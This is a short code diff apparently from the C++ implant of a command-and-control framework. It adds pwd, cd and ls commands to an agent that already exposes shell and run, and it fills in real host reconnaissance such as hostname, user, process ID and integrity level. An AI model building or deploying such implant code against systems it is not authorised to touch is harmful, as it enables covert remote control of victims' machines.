@@ -6,9 +6,8 @@
 #include <unordered_map>
 
 Agent::Agent(){
-	Metadata = generateMetadata();
 	Commands = loadCommands();
-
+	Metadata = generateMetadata();
 }
 
 std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> Agent::loadCommands() {
@@ -17,18 +16,22 @@ std::unordered_map<std::string, std::string(*)(std::vector<std::string> argument
 	commands["whoami"] = &whoami;
 	commands["shell"] = &shell;
 	commands["run"] = &run;
+	commands["pwd"] = &pwd;
+	commands["cd"] = &Cd;
+	commands["ls"] = &Ls;
 
 	return commands;
 }
 AgentMetadata Agent::generateMetadata() {
+	std::vector<std::string> arguments;
 	AgentMetadata metadata = {
 		1,
-		"hostname",
-		"username",
-		"processname",
-		1337,
-		"integrity",
-		"arch"
+		GetHostname(),
+		Commands["whoami"](arguments),
+		GetProcessname(),
+		GetCurrentProcessId(),
+		GetProcessIntegrityLevel(),
+		GetArch()
 	};
 	return metadata;
 }
